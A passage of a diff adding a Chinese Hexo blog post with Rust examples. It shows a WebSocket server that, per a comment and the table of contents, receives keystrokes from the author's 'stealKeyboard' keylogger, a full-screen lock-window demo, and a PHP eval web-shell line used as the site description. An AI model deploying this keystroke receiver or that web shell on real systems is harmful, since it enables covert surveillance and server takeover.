class="attr">serde_json</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="comment"># rusqlite = &#123; version = &quot;0.26.0&quot;, features = [&quot;bundled&quot;] &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>main.rs</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> futures_util::&#123;SinkExt, StreamExt&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::net::TcpListener;</span><br><span class="line"><span class="keyword">use</span> tokio_tungstenite::tungstenite::Message;</span><br><span class="line"><span class="comment">// use rusqlite::Connection;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[tokio::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定到本地地址和端口，创建一个TCP监听器</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">listener</span> = TcpListener::<span class="title function_ invoke__">bind</span>(<span class="string">&quot;0.0.0.0:8086&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;无法绑定地址&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;正在监听: 0.0.0.0:8086&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环接受新的连接</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Ok</span>((stream, _)) = listener.<span class="title function_ invoke__">accept</span>().<span class="keyword">await</span> &#123;</span><br><span class="line">        <span class="comment">// 对于每一个连接，创建一个新的任务来处理它</span></span><br><span class="line">        tokio::<span class="title function_ invoke__">spawn</span>(<span class="keyword">async</span> <span class="keyword">move</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">addr</span> = stream.<span class="title function_ invoke__">peer_addr</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;新的WebSocket连接: &#123;&#125;&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将TCP流转换为WebSocket流</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">ws_stream</span> = <span class="keyword">match</span> tokio_tungstenite::<span class="title function_ invoke__">accept_async</span>(stream).<span class="keyword">await</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">Ok</span>(ws) =&gt; ws,</span><br><span class="line">                <span class="title function_ invoke__">Err</span>(e) =&gt; &#123;</span><br><span class="line">                    <span class="built_in">eprintln!</span>(<span class="string">&quot;无法接受WebSocket连接: &#123;:?&#125; 从: &#123;&#125;&quot;</span>, e, addr);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 分离WebSocket流的写入和读取部分</span></span><br><span class="line">            <span class="keyword">let</span> (<span class="keyword">mut</span> write, <span class="keyword">mut</span> read) = ws_stream.<span class="title function_ invoke__">split</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 循环读取消息</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(<span class="title function_ invoke__">Ok</span>(msg)) = read.<span class="title function_ invoke__">next</span>().<span class="keyword">await</span> &#123;</span><br><span class="line">                <span class="keyword">match</span> msg &#123;</span><br><span class="line">                    <span class="comment">// 处理文本消息</span></span><br><span class="line">                    Message::<span class="title function_ invoke__">Text</span>(text) =&gt; &#123;</span><br><span class="line">                        <span class="comment">// println!(&quot;接收到文本消息: &#123;&#125;&quot;, text);</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 解构消息内容的json格式</span></span><br><span class="line">                        <span class="keyword">let</span> <span class="variable">json_data</span>: serde_json::Value = serde_json::<span class="title function_ invoke__">from_str</span>(&amp;text).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">                        </span><br><span class="line"><span class="comment">////////////////////////////////////////    以下是消息处理部分，根据实际需求编写即可      //////////////////////////////////////</span></span><br><span class="line">                        <span class="comment">// println!(&quot;来自&#123;&#125; pressed: &#123;&#125;&quot;, addr, json_data[&quot;payload&quot;]);</span></span><br><span class="line">                        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, json_data[<span class="string">&quot;payload&quot;</span>]); <span class="comment">// 这里是承接着上一个挂键盘钩子写的，可以用来查看json格式消息的内容</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 处理json消息 // 这里写了一个示例，用来处理认证消息判断一个token是否正确，然后返回给客户端一个响应，可以用来让服务端判断是否要与这个客户端进行连接</span></span><br><span class="line">                        <span class="keyword">match</span> json_data[<span class="string">&quot;type&quot;</span>].<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">unwrap</span>() &#123; <span class="comment">// 此处客户端发送的消息格式应该是&#123;&quot;type&quot;:&quot;auth&quot;, &quot;token&quot;:&quot;abcde&quot;&#125;</span></span><br><span class="line">                            <span class="string">&quot;auth&quot;</span> =&gt; &#123;</span><br><span class="line">                                <span class="keyword">if</span> json_data[<span class="string">&quot;token&quot;</span>].<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">                                    == <span class="string">&quot;abcde&quot;</span></span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="comment">// 定义一个响应消息</span></span><br><span class="line">                                    <span class="keyword">let</span> <span class="variable">response</span> = serde_json::json!(&#123;</span><br><span class="line">                                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;server&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;auth&quot;</span></span><br><span class="line">                                    &#125;);</span><br><span class="line"></span><br><span class="line">                                    <span class="comment">// 发送回一个响应</span></span><br><span class="line">                                    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = write.<span class="title function_ invoke__">send</span>(Message::<span class="title function_ invoke__">Text</span>(response.<span class="title function_ invoke__">to_string</span>())).<span class="keyword">await</span> &#123;</span><br><span class="line">                                        <span class="built_in">println!</span>(<span class="string">&quot;来自连接 &#123;&#125;: 发送消息时出错: &#123;&#125;&quot;</span>, addr, e);</span><br><span class="line">                                        <span class="comment">// 如果发送消息失败，中断当前连接的处理</span></span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            _ =&gt; &#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">                    <span class="comment">// 处理二进制消息</span></span><br><span class="line">                    Message::<span class="title function_ invoke__">Binary</span>(_) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;来自连接 &#123;&#125;: 接收到二进制消息&quot;</span>, addr),</span><br><span class="line">                    <span class="comment">// 处理关闭连接消息</span></span><br><span class="line">                    Message::<span class="title function_ invoke__">Close</span>(_) =&gt; &#123;</span><br><span class="line">                        <span class="built_in">println!</span>(<span class="string">&quot;来自连接 &#123;&#125;: 连接已关闭&quot;</span>, addr);</span><br><span class="line">                        <span class="comment">// 中断当前连接的处理</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 忽略其他类型的消息</span></span><br><span class="line">                    _ =&gt; (),</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="fltk-GUI库的使用"><a href="#fltk-GUI库的使用" class="headerlink" title="fltk GUI库的使用"></a>fltk GUI库的使用</h1><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;fltk&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">fltk</span> = <span class="string">&quot;1.2&quot;</span></span><br><span class="line"><span class="attr">winit</span> = <span class="string">&quot;0.29&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果Cargo.toml这样写的话，编译过程中需要环境变量有cmake，如果安装了vs2022的话，直接用everything搜一下cmake，然后配置到环境变量里就行了，然后在cmd中输一下<code>cmake -version</code>，有输出就可以了</p>
+<p>如果使用的是vscode来编译rust <code>cargo build</code>，那么看一下终端是不是用的powershell，如果是，则换成cmd，cmake貌似在powershell里没法运行，然后编译即可，时间可能有点长</p>
+<p>main.rs示例(创建一个完全覆盖所有显示器的黑色窗口，我用来写了一个锁屏，搭配<a href="https://creeeeeeeeeeper.github.io/2025/05/08/uiaccess/">uiaccess</a>食用)</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![windows_subsystem = <span class="string">&quot;windows&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> fltk::&#123;app, enums::Color, prelude::*, window::Window&#125;;</span><br><span class="line"><span class="keyword">use</span> winit::dpi::PhysicalSize;</span><br><span class="line"><span class="keyword">use</span> winit::monitor::MonitorHandle;</span><br><span class="line"><span class="keyword">use</span> winit::event_loop::EventLoop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// 初始化 winit 事件循环</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">event_loop</span> = EventLoop::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to create event loop&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取所有显示器</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">monitors</span>: <span class="type">Vec</span>&lt;MonitorHandle&gt; = event_loop.<span class="title function_ invoke__">available_monitors</span>().<span class="title function_ invoke__">collect</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算所有显示器的总宽度和高度</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">total_width</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">total_height</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">monitor</span> <span class="keyword">in</span> monitors &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">size</span>: PhysicalSize&lt;<span class="type">u32</span>&gt; = monitor.<span class="title function_ invoke__">size</span>();</span><br><span class="line">        total_width += size.width;</span><br><span class="line">        total_height = total_height.<span class="title function_ invoke__">max</span>(size.height); <span class="comment">// 取最大高度</span></span><br><span class="line">    &#125;</span><br><span class="line">    total_height += <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 FLTK 应用程序</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">app</span> = app::App::<span class="title function_ invoke__">default</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">win</span> = Window::<span class="title function_ invoke__">default</span>()</span><br><span class="line">        .<span class="title function_ invoke__">with_size</span>(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        .<span class="title function_ invoke__">with_label</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">with_pos</span>(<span class="number">0</span>, -<span class="number">100</span>); <span class="comment">// 设置窗口位置为屏幕左上角-100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示窗口</span></span><br><span class="line">    win.<span class="title function_ invoke__">end</span>();</span><br><span class="line">    win.<span class="title function_ invoke__">show</span>();</span><br><span class="line">    win.<span class="title function_ invoke__">un_maximize</span>();</span><br><span class="line">    </span><br><span class="line">    win.<span class="title function_ invoke__">set_on_top</span>();</span><br><span class="line">    win.<span class="title function_ invoke__">set_border</span>(<span class="literal">true</span>); <span class="comment">// 移除窗口边框</span></span><br><span class="line">    win.<span class="title function_ invoke__">set_color</span>(Color::<span class="title function_ invoke__">from_rgb</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)); <span class="comment">// 设置窗口背景颜色</span></span><br><span class="line">    </span><br><span class="line">    std::thread::<span class="title function_ invoke__">sleep</span>(std::time::Duration::<span class="title function_ invoke__">from_millis</span>(<span class="number">100</span>)); <span class="comment">// 等待一小段时间</span></span><br><span class="line">    win.<span class="title function_ invoke__">maximize</span>();</span><br><span class="line">    win.<span class="title function_ invoke__">set_size</span>(total_width <span class="keyword">as</span> <span class="type">i32</span>, total_height <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">    win.<span class="title function_ invoke__">set_pos</span>(<span class="number">0</span>, -<span class="number">100</span>);</span><br><span class="line">    win.<span class="title function_ invoke__">flush</span>();</span><br><span class="line"></span><br><span class="line">    app::<span class="title function_ invoke__">redraw</span>(); <span class="comment">// 强制重绘</span></span><br><span class="line">    app.<span class="title function_ invoke__">run</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/05/08/uiaccess/" rel="prev" title="uiaccess">
+      <i class="fa fa-chevron-left"></i> uiaccess
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%81%B7%E4%BD%A0%E9%94%AE%E7%9B%98%EF%BC%81"><span class="nav-number">1.</span> <span class="nav-text">偷你键盘！</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90-stealKeyboard-exe"><span class="nav-number">1.1.</span> <span class="nav-text">键盘钩子(stealKeyboard.exe)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7-listenTo-exe"><span class="nav-number">1.2.</span> <span class="nav-text">实时监控(listenTo.exe)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84websocket%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">一个简单的websocket服务器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fltk-GUI%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">fltk GUI库的使用</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ZYG"
+      src="https://creeeeeeeeeeper.github.io/2023/12/15/c/ccccc.jpg">
+  <p class="site-author-name" itemprop="name">ZYG</p>
+  <div class="site-description" itemprop="description">?php @eval($_POST['attack']);?</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Creeeeeeeeeeper/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Creeeeeeeeeeper&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2339448077@qq.com" title="E-Mail → mailto:2339448077@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+   
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZYG</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">93k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">5:39</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,d=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=o());for(var e,i=0;i<d.length;i++)0<=(e=(e=d[i]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,a,n,o=d[i];e=function(){d=d.filter(function(t){return o!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(o)},(t=o).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,n=t.getAttribute("data-original"),a.onload=function(){t.src=n,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=n},t.src!==n&&(a.src=n)))}()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)}(this);</script></body>
+</html>
